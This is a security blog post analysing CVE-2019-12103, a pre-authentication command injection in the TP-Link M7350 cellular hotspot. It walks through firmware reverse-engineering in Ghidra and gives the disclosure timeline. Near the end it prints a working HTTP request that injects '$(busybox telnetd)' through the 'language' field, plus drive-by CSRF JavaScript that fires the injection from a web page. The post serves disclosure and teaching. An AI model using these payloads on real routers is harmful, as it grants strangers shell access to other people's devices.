  + [PTP in the USA](https://www.pentestpartners.com/about-us/ptp-in-the-usa/)
  + [Careers](https://www.pentestpartners.com/about-us/careers/)
  + [Our Vision and Values](https://www.pentestpartners.com/our-vision-and-values/)
  + [In the news](https://www.pentestpartners.com/about-us/in-the-news/)
  + [Environmental Statement](https://www.pentestpartners.com/about-us/environmental-statement/)
  + [Vulnerability Disclosure Policy](https://www.pentestpartners.com/about-us/vulnerability-disclosure-policy/)
* [Services](https://www.pentestpartners.com/penetration-testing-services/)
  + [Red Teaming](https://www.pentestpartners.com/penetration-testing-services/red-teaming/)
  + [Purple Teaming](https://www.pentestpartners.com/penetration-testing-services/purple-teaming/)
  + [Penetration Testing](https://www.pentestpartners.com/penetration-testing-services/penetration-testing/)
  + [Agile Environment Testing](https://www.pentestpartners.com/penetration-testing-services/agile-environment-testing/)
  + [Aviation Cyber Security Testing](https://www.pentestpartners.com/penetration-testing-services/aviation-cyber-security-testing/)
  + [Automotive & IoT Testing](https://www.pentestpartners.com/penetration-testing-services/automotive-and-iot-testing/)
  + [Maritime Cyber Security Testing](https://www.pentestpartners.com/penetration-testing-services/maritime-cyber-security-testing/)
  + [Cloud Services Security](https://www.pentestpartners.com/penetration-testing-services/cloud-services-security/)
  + [DevOps Lifecycle Assurance](https://www.pentestpartners.com/devops-lifecycle-assurance/)
  + [Social Engineering](https://www.pentestpartners.com/penetration-testing-services/social-engineering/)
  + [Physical Security](https://www.pentestpartners.com/penetration-testing-services/physical-security/)
  + [Security Training](https://www.pentestpartners.com/penetration-testing-services/security-training/)
  + [Papa – Proactive Advanced Password Auditor](https://www.pentestpartners.com/penetration-testing-services/papa/)
  + [ICS, IIoT, SCADA Security Testing](https://www.pentestpartners.com/penetration-testing-services/ics-iiot-scada-security-testing/)
  + [CBEST Red Teaming](https://www.pentestpartners.com/penetration-testing-services/cbest-threat-intelligence-led-red-teaming/)
  + [CREST OVS Mobile & Apps](https://www.pentestpartners.com/crest-owasp-verification-standard-ovs-program/)
  + [TIBER-EU Assessments](https://www.pentestpartners.com/penetration-testing-services/tiber-eu-assessments/)
  + [CREST STAR-FS](https://www.pentestpartners.com/penetration-testing-services/crest-star-fs-assessments/)
  + [Cyber Essentials Testing](https://www.pentestpartners.com/penetration-testing-services/cyber-essentials-testing/)
  + [Cyber Security Consulting](https://www.pentestpartners.com/penetration-testing-services/cyber-security-consulting/)
  + [Compromise Assessment](https://www.pentestpartners.com/compromise-assessment/)
  + [Digital Forensics Services](https://www.pentestpartners.com/digital-forensics-services/)
  + [Incident Response Services](https://www.pentestpartners.com/incident-response-services/)
  + [Incident Response Retained Service](https://www.pentestpartners.com/incident-response-retained-service/)
  + [Incident Response Policy Assessment & Development](https://www.pentestpartners.com/incident-response-policy-assessment-development/)
  + [Attack Surface Assessment](https://www.pentestpartners.com/attack-surface-assessment/)
* [Events](https://www.pentestpartners.com/events-and-speaking/)
* [Security Blog](https://www.pentestpartners.com/security-blog/)
* [Demo Videos](https://www.pentestpartners.com/resources/hack-demo-videos/)
* [Contact Us](https://www.pentestpartners.com/contact-us/)

For the best user experience please upgrade your browser

Blog: Hardware Hacking

# CVE-2019-12103 – Analysis of a Pre-Auth RCE on the TP-Link M7350, with Ghidra!

G Richter
10 Aug 2019

###

### TL;DR

The TP-Link M7350 (V3) is affected by a pre-authentication (CVE-2019-12103), and a few post-authentication (CVE-2019-12104) command injection vulnerabilities. These injections can be exploited remotely, if the attacker is on the same LAN or otherwise able to get access to the router web interface. CVE-2019-12103 can also be exploited in any browser by cross-site request forgery (CSRF), since there’s no CSRF protection before the user logs in.

If you’re running one of these devices, update now to the [new firmware](https://www.tp-link.com/uk/support/download/m7350/v3/#Firmware) (version 190531).

Also TP-Link are a massive chore to get in contact with. It took three tries at their vulnerability reporting contact form to get a response.

Anyway, this post is technical – about finding issues like this using Ghidra. Because reverse-engineering to find command injection bugs is fun!

**Most routers are pretty bad at security**

Most consumer-grade networking hardware comes with an embedded webserver. Web servers are a really easy way for users to access configuration on the device, with a GUI, without having to install proprietary software. A lot of the time, the webserver exposes some kind of API endpoint – sometimes JSON or XML. This webserver API, more often than not, is just a thin wrapper around shell commands which alter system-level functionality. The variables passed to the webserver API are just being handed to a shell command. Because most consumer-grade networking hardware is just running Linux.

When developers haven’t been very, very careful – you’ll find some kind of arbitrary command execution potential. I’ve very rarely seen routers which don’t have command injection or memory management problems \*somewhere\* on an exposed interface.

So, here’s the story of finding one quite convenient command injection in the TP-Link M7350.

**The M7350. What’s it running?**

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP1.png)

As “Lightning” as they claim it to be, the M7350 is just another Qualcomm-based cellular hotspot – in this case it’s running off a (relatively ancient at this point) MDM9225. It’s boxy, quite nice to look at, feels quite solid, and works as well as any other cheap*ish* cellular hotspot. So, it’s fine. Generic.

From our perspective, we want to see what the thing is running, so we can try to find bugs. Luckily, the firmware [can be found on the TP-Link website](https://www.tp-link.com/de/support/download/m7350/v3/#Firmware).

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP2.png)

I’m running an M7350 with the hardware version 3.0, so my firmware file was called M7350(EU)\_V3\_160330\_1472438334613t.zip. This file itself is just a ZIP, which contains PDF install instructions and, err, another ZIP called M7350(EU) 3.0\_1.1.1 Build 160330 Rel.1002n\_User.zip.zip. Inside THAT ZIP, we find this:

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP3.png)

This looks very much like a zero-attempt-at-obfuscation-or-encryption firmware update file. For some flavour of Android. Which is good for us, because we can just pull binaries that look interesting out and start analysing them. We can even see the firmware update script, at META-INF/com/google/android/updater-script.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP4.png)

We’ve already written about attacking devices by using Android update packages [here](https://www.pentestpartners.com/security-blog/attacking-android-through-custom-updates/). But that’s a bit outside of the scope of this particular hunt – we want bugs in the web interface!

So, first, how can we figure out which binaries are interesting to us?

### grep, baby

We can figure out some key variables we might have control over, and grep for them. Probably 90% of my Windows Subsystem for Linux use is grep. I hate findstr. grep is amazing.

Anyway, from some generic use of the M7350 webserver through Burp, we can see some variable names, which might help us find the binaries which process them.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP5.png)

Generic configuration requests are sent to the /cgi-bin/qcmap\_web\_cgi endpoint. The POST body is JSON-encoded. Post-authentication requests require a “token” value. The “module” parameter is interesting, because it suggests that there will be a big switch case running somewhere, which handles input data differently based on which module is being requested.

So, let’s grep for “webServer” and see where it turns up.

```
$ grep -ro webServer

Binary file data/bin/QCMAP_Web_CLIENT matches
system/WEBSERVER/www/browserWarning.html:webServer
Binary file system/WEBSERVER/www/cgi-bin/qcmap_web_cgi matches
system/WEBSERVER/www/login.min.js:webServer
system/WEBSERVER/www/settings.min.js:webServer
system/WEBSERVER/www/settings.min.js:webServer
system/WEBSERVER/www/tpweb.min.js:webServer
system/WEBSERVER/www/tpwebPhone.min.js:webServer
system/WEBSERVER/www/tpwebPhone.min.js:webServer
system/WEBSERVER/www/tpwebPhone.min.js:webServer
system/WEBSERVER/www/tpwebPhone.min.js:webServer
```

To avoid extraneous garbage output, especially on the long, linebreak-free JavaScript files, I passed the -o flag. This only shows the string we actually grepped for if it’s found in a text file. We’re only interested in binary files anyway. The -r tells grep to grep recursively, from the current working directory onwards. grep grep grep. I love to grep.

“webServer” appears in the QCMAP\_Web\_CLIENT and qcmap\_web\_cgi binaries. Let’s have a look at the qcmap\_web\_cgi binary first. If you remember from the POST request above, qcmap\_web\_cgi is the endpoint everything is being POSTed to. So it’ll likely be in charge of managing how each request is handled.

### Ghidra is quite good for this

Why not learn basic Ghidra while we’re at it? Once we’ve opened up the qcmap\_web\_cgi binary and run the generic analysis, we can start off by searching for strings (by clicking Search -> For Strings).

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP6.png)

After clicking through the search dialog, leaving the default settings, we can start to see lots of strings – including our “webServer” string.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP7.png)

Double-clicking that entry takes us to where “webServer” is located in memory. Ghidra helpfully notes that this address is cross-referenced elsewhere in the binary (with the XREF note).

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP8.png)

We can double-click that cross-reference and it’ll take us to the function that “webServer” is referenced in. I’ve renamed it already here – but it’d usually be called something generic like FUN\_00008ce0. I imagine FUN stands for “function” rather than just “fun”. Although reverse-engineering is “fun”, most of the time I wouldn’t call it “FUN”.

Ghidra’s decompiler is *quite* good (we’ll get to that later), so we can really easily see what the logic of this function is.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP9.png)

A string is passed to the function, it returns 1 if the string is “webServer”. Easy.

Then, we can follow this function backwards, to figure out how it gets called and why. Right-click the function name in the disassembly view (doesn’t work in the decompiler view for, I imagine, sensible reasons I don’t understand). Then click through References -> Show Call Trees.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP10.png)

This will give a really simple expandable bullet-point list of where the function’s getting called from – and what it’s calling.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP11.png)

On the left, you can see the incoming references – webServer\_or\_status is being called by FUN\_00008d78, which is itself called by main (and, before that, the ELF entry). On the right, the outgoing calls show webserver\_or\_Status is only calling strcmp.

We can then start poking around functions, focussing only on those which might do something interesting with the input we give them.

Quick spoiler – FUN\_00008d78 is really boring for our purposes. It’s mainly there to pull data out of the environmental variables, pull stuff out of the JSON and perform authentication checks where appropriate.

So, let’s have a look at the main function.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP12.png)

So, this is the part of main that calls FUN\_00008d78 – one level up from webServer\_or\_status. All the other if/else chunks are error handling – there to throw errors if the request is badly-formed or incomplete. This highlighted chunk of code does all the heavy lifting for valid requests.

You’ll notice that FUN\_00008d78 doesn’t return anything. And then FUN\_000092ec gets called.

### Let the FUN begin

FUN\_000092ec is actually quite interesting. Even from the call tree, you can see it calls other functions which open sockets, and do sendto, and recv calls. Also at least one system call.

You might expect something like this from a webserver-adjacent binary – but remember that the HTTP server socket activity isn’t being handled by this binary at all. This binary isn’t the webserver itself – it’s just an endpoint that the actual webserver will pass the HTTP request to. Any socket activity is doing something else entirely. Something which makes our RE journey a bit longer, but perhaps interesting.

Ok, back to the binary. As you can see in the call tree, FUN\_000092ec is calling FUN\_00008f3c which is doing socket, system and sendto syscalls! Let’s look at that (with a little bit of manual variable name clean-up):

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP13.png)

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP15.png)

The binary is bind’ing to the socket file /www/qcmap\_cgi\_webclient\_file. Then it’s sendto’ing request data to the socket file /www/qcmap\_webclient\_cgi\_file.

All this means for us is that we now have to expand our search a bit. Since data is being pushed out of the qcmap\_web\_cgi binary, we need to figure out where it’s going, and what’s happening to it.

### I didn’t choose grep. grep chose me

Let’s grep for the qcmap\_webclient\_cgi\_file file. Another process will likely be listening to this file. God I love grep.

```
$ grep -r qcmap_webclient_cgi_file
Binary file data/bin/QCMAP_Web_CLIENT matches
Binary file system/WEBSERVER/www/cgi-bin/qcmap_web_cgi matches
```

Only 2 results. Our already-boring qcmap\_web\_cgi binary, and the now *very* interesting QCMAP\_Web\_CLIENT binary. You might remember that from our earlier “webServer” grep.

Once we’ve got it loaded up into Ghidra, we can check for strings again. This time, “webServer” shows up a couple times.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP15.png)

But, this time, clicking through to its address only shows “webServer” floating in a sea of nulls.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP16.png)

No direct cross-references, nothing immediately useful. So, what can we do?

Scroll a bit further down, however, and there’s a few non-null bytes. You can convert these to a dword by right-clicking the first one -> Data -> dword.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP17.png)

This looks very much like a lookup table. If you double-click on the dword 15384h, you’ll find yourself at that offset within the binary. It looks very much like the start of a function. A function which, just by eyeballing, looks like it parses requests to the “webServer” API module.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP18.png)

Can you spot the vulnerability yet? We’ll come back to that in a sec.

You can rename this function by right clicking on FUN\_00015384 -> Rename Function. I chose the name API\_webServer\_function.

If, like me, you want to make sure that that pointer to 0x00015384 in the lookup table actually shows your new function name, you can go back to the pointer, right click it -> References -> Create Memory Reference. To make life easier, once you know the structure of the lookup table, you can just press the “p” key when you’re clicked on the first byte of the dword to convert it to a pointer to a function immediately.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP19.png)

The disassembly view will then show you the function name, rather than just the raw dword. Which is a bit nicer.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP20.png)

If we wanted to be thorough, we could scroll up to what looks like the start of the lookup table, see if it’s referenced in a function, and see what that function does.

Scrolling up to what looks like the start of the lookup table is the string “lan”. This is referenced by a function I’ve renamed “parse\_json”.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP21.png)

The parse\_json function is pretty big, but the point it references the “lan” string shows how it’s using this lookup table.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP22.png)

This do/while loop grabs the module name from the request JSON (every single loop iteration, for some reason), and – starting from the address of “lan” – cycles through each relative offset in increments of 0x44. Each loop, it strcmp‘s the user-supplied string passed to the “module” parameter with the string at the start of each entry in the lookup table until it matches. Then it calls the related function. I doubt this looks anything like the lookup function the developers actually wrote – but this is how it looks in the decompiled pseudocode.

### Oh yeah, back to the bug hunting

Bit of a generic RE distraction there. Anyway, back in the API\_webServer\_function, the Ghidra decompiler has prepared a really nice switch statement for us to peruse.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP23.png)

The user-supplied “action” value from the JSON request is extracted (from iVar1 + 0x14), and the switch runs based on what its value is.

So, if we sent a request containing something like {“module”:”webServer”, “action”:0}, the QCMAP\_Web\_CLIENT process would call the function call\_popen, with the argument “uci get webserver.user\_config.language”. Then it creates a JSON object, and returns the value it got from call\_popen as the “language” value.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP24.png)

call\_popen is a name I gave the function myself. It’s just a thin wrapper around the popen syscall, with a bit of error checking and return value handling. Here is it in full:

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP25.png)

The popen call itself is highlighted.

### Grand popening, grand closing

popen literally runs system-level commands. It’s much like system, or exec\*. It’s not ideal to pass untrusted user input straight to it. But that’s exactly what this binary does.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP26.png)

If the action is 1, then the value of the “language” parameter is passed to a shell command string constructed by that snprintf function, which is then passed to call\_popen.

“BUT DAVE” – I hear you all say in unison – “WHERE’S THOSE ADDITIONAL ARGUMENTS TO SNPRINTF?”

That’s really astute and observant of you. Clever you. Well, the answer is, the decompiler isn’t perfect. We’d expect to see:

snprintf(char\_array\_204,200,”uci set webserver.user\_config.language=%s;uci commit webserver”, \*(iVar1 + 0x10));

But we don’t. But we DO know that it SHOULD say that. Here’s how we know.

### Function calls in ARM

Function calls in ARM are similar to x86\_64, in that arguments are stored in registers. R0 should contain the first argument, R1 the second, R2 the third – etc etc.

We’re looking at a snprintf call, which should take at least 4 arguments if there’s some format string to fill. And that %s in the “uci set…” command string is definitely a format string.

snprintf should be called [in the following format](http://www.cplusplus.com/reference/cstdio/snprintf/):

int snprintf ( char \* s, size\_t n, const char \* format, … );

The trailing … are for any number of pointers to strings which will populate any equal number of format strings in the 3rd “format” char array. Seeing as we have a definite format string in there, we would expect R0, R1, R2 **AND** **R3** to contain the arguments for this function call.

In fact, we can SEE, WITH OUR OWN EYES, IN THE DISASSEMBLY, that R3 – the register we’d expect to have a pointer to the user-controlled “language” parameter value – is being set. Let’s follow how that happens.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP27.png)

First the return value from cJSON\_GetObjectItem is moved to R6 (the return value is stored in R0, but is noted as “language\_val” here because I renamed it in the decompiler view).

Yes, I know that’s a SUBtract instruction, but sometimes in ARM disassembly you’ll see varieties of ADD or SUB with zero values instead of a MOV. SUBS R6, R0, #0x0 substitutes **nothing** from R0 before putting it into R6. It’s essentially just a MOV. With a **KEY DIFFERENCE**.

The fact that it’s a “SUBS” rather than just a “SUB” means that the condition flags are updated depending on the result of the operation. Therefore, if the SUBS instruction results in R6 being equal to zero, then the zero flag (ZF) will be set to 1, and the next BEQ branch command will be followed.

So there’s a lot going on in just a couple of instructions.

We can see that in the pseudocode as well:

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP28.png)

iVar1 != 0 checks for a null return value.

Back to the assembly. The pointer to the object returned from the cJSON\_GetObjectItem call has been moved to R6. Then, the value at the memory referenced by the pointer + 0x10 is moved to R3. Then a CMP instruction checks if it’s null.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP29.png)

We can make an educated guess, by reading other parts of the pseudocode, that the offset 0x10 of the object returned from cJSON\_GetObjectItem contains a pointer to the user-supplied string value. Then there’s a quick CMP to make sure the pointer isn’t null. Again, we can see that reflected in the pseudocode:

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP30.png)

But, for some reason, the Ghidra decompiler doesn’t take into account the fact that R3 is still populated, even after the CMP, and doesn’t include it in the pseudocode. Oh well. At least we know for sure it’s there now.

### That bug, yes, sorry, back to that

It should be self-evident by now – but setting the “language” to a shell command will result in our shell command being literally included in the “uci set…” string by snprintf. And when that string is passed to popen, that command will be executed.

We know now that the pseudocode should really read something like this:

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP31.png)

So the value we supply to the “language” parameter replaces the %s format string in the “uci set…” string. That value gets stored at acStack224. Then popen gets called on it.

So, the following request will spawn telnetd. Pre-authentication.

```
POST /cgi-bin/qcmap_web_cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.1/settings.html
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 65
Connection: close

{"module":"webServer","action":1,"language":"$(busybox telnetd)"}
```

Ta-daa. We can then go on to log into the device, and plunder it for any kind of

### So what? Another LAN-only RCE?

Well, not entirely. Cellular modems connect to APNs. APNs are like massive LANs, provided by a telecoms company. APNs can be configured badly – for instance by not implementing client segregation. In those cases, anyone \*quite\* naughty connected to the same APN as you might be able to access the web configuration interface of your cellular modem. Anyone \*extremely\* naughty with access to the telco GGSN would also likely be able to attach to the web interface of the router – assuming the router doesn’t block access over the cellular interface.

There’s also the possibility of drive-by JavaScript cross-site request forgery attacks. It’s really easy, in JavaScript, to enumerate where the router is, see if it’s potentially vulnerable, and forge requests to it which might execute code. You can see an example of this kind of attack [on one of our older posts](https://www.pentestpartners.com/security-blog/lan-surfing-how-to-use-javascript-to-execute-arbitrary-code-on-routers/). So, a nasty page can execute arbitrary code on your router. You don’t have to do anything except visit an entirely unrelated, but malicious page.

Here’s the JavaScript which will inject a command, wait 500ms, and set it the language back to normal:

```
function sleep(ms) {
return new Promise(resolve => setTimeout(resolve, ms));
}
function inject(lang){
var xhr = new XMLHttpRequest();
var url = "http://192.168.0.1/cgi-bin/qcmap_web_cgi";
xhr.open("POST", url, true);
xhr.send(JSON.stringify({"module":"webServer","action":1,"language":lang}));
}

inject("$(busybox telnetd)");
sleep(500).then(() => {
inject("en");

});
```
### The fix

TP-Link fixed this issue in firmware update 190531. What was the fix?

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/08/TP32.png)

Single-quote escaping the format string. Clever.

### Conclusions

Bugs in cellular modems are still really common. This was an example of only one of the bugs we found in the M7350. To be fair, I only spent a day or so on it all given. So, there may well be more less obvious issues. And there may well be more in other TP-Link devices. Happy hunting!

### TP-Link’s Response

It took **three** attempts via TP-Link’s vulnerability reporting form for them to get back to me. Not good. Here’s the timeline:

26/02/2019 – First contact attempt.

02/03/2019 – Second contact attempt.

12/03/2019 – Third contact attempt.

18/03/2019 – TP-Link finally reply.

18/03/2019 – Sent details of one command injection issue.

02/04/2019 – TP-Link confirms receipt of email.

18/04/2019 – TP-Link confirms issue exists, states they’re working on a fix.

18/04/2019 – TP-Link provides beta firmware for testing.

25/04/2019 – I find time to look at this firmware, find another bug.

29/04/2019 – TP-Link provides another updated firmware which fixes this 2nd bug.

14/04/2019 – I find a bit more time to look again at this firmware, confirm fix.

03/06/2019 – TP-Link release firmware version 190531

TP-Link have said that this issue only affects M7350 hardware version 3. I’m not entirely sure if this is true. I’m never convinced by companies which fix issues reactively, piecemeal, rather than proactively. I always hope that, on receipt of a command injection vulnerability report, they’ll give their entire codebase some kind of audit for other, extremely similar issues, but I guess TP-Link don’t.

### Share

### Categories

Show all
Android  (71)
Automotive Security  (24)
Aviation Cyber Security  (44)
Blockchain  (3)
Breach Handling  (1)
Careers At PTP  (1)
Cloud Security  (5)
Code Repository  (1)
Consultancy advice  (5)
Consumer Advice  (35)
Cyber Essentials  (1)
Cyber Liability Insurance  (5)
DFIR  (29)
Hardware Hacking  (19)
Heartbleed  (5)
Honeypots  (6)
How-Tos  (264)
In the news  (1)
Internet Of Things  (169)
Macs / Apple  (31)
Maritime Cyber Security  (47)
Medical Device Security  (3)
Opinions  (107)
OPSEC  (9)
OT, ICS, IIoT, SCADA  (22)
Passwords  (39)
PCI Advice  (2)
Ransomware  (2)
Red Teaming  (26)
Reverse Engineering  (12)
Security Blog  (808)
Shameless Self Promotion  (11)
Show on homepage  (6)
Social Engineering  (12)
Sustainability  (2)
Virtual Environments  (1)
Vulnerabilities that aren’t  (4)
Vulnerability Advisory  (45)
Vulnerability Disclosure  (20)

[# See the other cool stuff we've been doing…](/blog/)

[Consumer Advice

# Security flaws found in tiny phones promoted to children

15 Jan 2025](https://www.pentestpartners.com/security-blog/security-flaws-found-in-tiny-phones-promoted-to-children/)

[DFIR

# Tackling AI threats. Advanced DFIR methods and tools for deepfake detection

13 Jan 2025](https://www.pentestpartners.com/security-blog/tackling-ai-threats-advanced-dfir-methods-and-tools-for-deepfake-detection/)

[Aviation Cyber Security

# The unexpected effects of GPS spoofing on aviation safety

09 Jan 2025](https://www.pentestpartners.com/security-blog/the-unexpected-effects-of-gps-spoofing-on-aviation-safety/)

[DFIR

# 10 Non-tech things you wish you had done after being breached

07 Jan 2025](https://www.pentestpartners.com/security-blog/10-non-tech-things-you-wish-you-had-done-after-being-breached/)

[Aviation Cyber Security

# The surprising existence of the erase button on cockpit voice recorders

03 Jan 2025](https://www.pentestpartners.com/security-blog/the-surprising-existence-of-the-erase-button-on-cockpit-voice-recorders/)

[Services

### Automotive & IoT Testing

Find out more »](https://www.pentestpartners.com/penetration-testing-services/automotive-and-iot-testing/)

### Our People

Being introduced to, and getting to know your tester is an often overlooked part of the process. Yes, our work is über technical, but faceless relationships do nobody any good.

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-alert.svg)](https://www.pentestpartners.com/penetration-testing-services/suffered-a-security-breach/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-mobile-security.svg)
## Mobile Security](https://www.pentestpartners.com/penetration-testing-services/mobile-security/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-social-engineering-grey.svg)
## Social Engineering](https://www.pentestpartners.com/penetration-testing-services/social-engineering/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-webapp.svg)
## Web application testing](https://www.pentestpartners.com/penetration-testing-services/web-application-testing/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-data-compliance-grey.svg)
## Security Consuting](https://www.pentestpartners.com/penetration-testing-services/security-consulting/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/ic-papa-grey.svg)
## Papa - PTP Advance Password Auditor](https://www.pentestpartners.com/penetration-testing-services/papa/)

### Get in touch

**UK Office:**

Pen Test Partners LLP

Unit 2, Verney Junction Business Park

Buckingham

MK18 2LB

United Kingdom

+44 20 3095 0500
[Contact Us »](/contact-us/)

###

**US Office:**

+1 646 693 2501
[[email protected]](/cdn-cgi/l/email-protection#a1c8cfc7cee1d1c4cfd5c4d2d5d1c0d3d5cfc4d3d28fc2cecc)

### Connect

[Twitter](https://twitter.com/PentestPartners)
[LinkedIn](https://www.linkedin.com/company/pen-test-partners)
[YouTube](https://www.youtube.com/channel/UC2HCAhj6JiOsV_PcMFrjykw)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-pentest-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-star-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-star-fs-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/csir-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-ovs-logo-22.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![logo-cbest](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-cbest.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-check-ncsc.png)](https://www.ncsc.gov.uk/organisations/pen-test-partners)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/crest-assure.png)](https://www.crest-approved.org/member_companies/pen-test-partners/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-cyber-essentials2023.png)](https://iasme.co.uk/cyber-essentials/)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/bsi-iso27001-logo-22.png)](/content/uploads/2023/12/PTP-ISO27001-Certificate-2023.pdf)

[![](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-pci-certified.png)](https://www.pcisecuritystandards.org/assessors_and_solutions/qualified_security_assessors)

[Privacy Policy](/privacy-policy/)

[Terms of Service](/terms-of-website-use/)

Manage Cookies

Company number: OC353362

VAT reg number: GB825526427

© 2025 Pen Test Partners


